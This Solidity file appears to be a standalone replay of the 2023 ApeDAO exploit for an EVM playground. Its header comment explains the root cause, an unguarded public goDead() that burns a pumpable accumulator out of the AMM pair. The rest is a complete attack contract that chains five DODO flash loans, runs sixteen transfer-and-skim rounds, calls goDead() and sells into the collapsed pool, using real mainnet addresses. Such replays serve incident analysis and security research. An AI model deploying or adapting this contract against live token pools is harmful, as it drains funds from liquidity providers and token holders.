// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-ApeDAO).
// The DeFiHackLabs PoC (test/ApeDAO_exp.sol) runs the attack INLINE in the
// Foundry test contract `ApeDAOTest` (attacker = address(this); the DODO
// flash-loan callback `DPPFlashLoanCall` lives on the test itself), so there is
// no standalone exploit contract to deploy as-is. This contract is a faithful,
// self-contained copy of that inline attack (5-deep nested DODO flash-loan
// cascade -> buy APEDAO -> 16x transfer+skim loop -> goDead() -> sell APEDAO ->
// repay loans), so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/ApeDAO_exp.sol.
//
// Root cause (APE2/APEDAO, verified on-chain, contracts_kape_APE2.sol):
// `goDead()` is a PUBLIC, unguarded function that burns the token's
// attacker-pumpable `amountToDead` accumulator directly out of the AMM pair's
// own balance (_rawTransfer(pair, 0xdEaD, amountToDead)) and then calls
// pair.sync() to force the pair to adopt the reduced balance as its new
// reserve. No BUSDT leaves the pair, so the constant product k collapses
// one-sided. `amountToDead` itself grows by 20% of the GROSS amount on every
// transfer classified as a "sell" (transfer TO the pair), and the attacker can
// fake sells for free: transferring APEDAO into the pair and immediately
// calling the pair's permissionless skim() recovers almost the entire amount,
// while still ratcheting amountToDead upward each round. Sixteen rounds of
// transfer+skim pump amountToDead to ~99% of the pool's APEDAO reserve; calling
// goDead() then annihilates that reserve for free, and the attacker sells a
// small APEDAO bag into the now-degenerate pool for a large BUSDT payout.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IAPEDAO is IERC20 {
    function goDead() external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

contract ApeDAODrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAPEDAO constant APEDAO = IAPEDAO(0xB47955B5B7EAF49C815EBc389850eb576C460092);

    IDPPOracle constant DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle constant DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakeRouter constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant Pair = IPancakePair(0xee2a9D05B943C1F33f3920C750Ac88F74D0220c3);

    // step 0: kick off the 5-deep nested DODO flash-loan cascade (liquidity sourcing only).
    function run() external {
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPAdvanced)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else {
            // All 5 flash loans are now open. Start the real attack.
            BUSDT.approve(address(Router), type(uint256).max);

            swapBUSDTToAPEDAO();
            for (uint256 i; i < 16; i++) {
                // Transfer APEDAO to Pair contract and use skim function to withdraw the excess tokens.
                // Each round is classified as a "sell" -> amountToDead += 20% of gross, while skim()
                // returns almost all of the transferred APEDAO right back to the attacker for free.
                APEDAO.transfer(address(Pair), APEDAO.balanceOf(address(this)));
                Pair.skim(address(this));
            }
            // Burn APEDAO tokens in Pair contract (cause the token price to rise).
            // goDead() is PUBLIC and unguarded: it burns the pumped amountToDead directly
            // out of the pair's own APEDAO balance, then calls pair.sync() to force the
            // pair to accept the reduced balance as its new reserve. No BUSDT leaves.
            APEDAO.goDead();

            BUSDT.transfer(address(Pair), 1001);
            uint256 amountIn = APEDAO.balanceOf(address(this));
            APEDAO.transfer(address(Pair), APEDAO.balanceOf(address(this)));
            swapAPEDAOToBUSDT(amountIn);
        }
        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function swapBUSDTToAPEDAO() internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(APEDAO);
        Router.swapExactTokensForTokens(19_000 * 1e18, 0, path, address(this), block.timestamp + 100);
    }

    function swapAPEDAOToBUSDT(uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = address(APEDAO);
        path[1] = address(BUSDT);
        uint256[] memory amounts = Router.getAmountsOut(amountIn, path);
        Pair.swap(amounts[1], 0, address(this), bytes(""));
    }
}
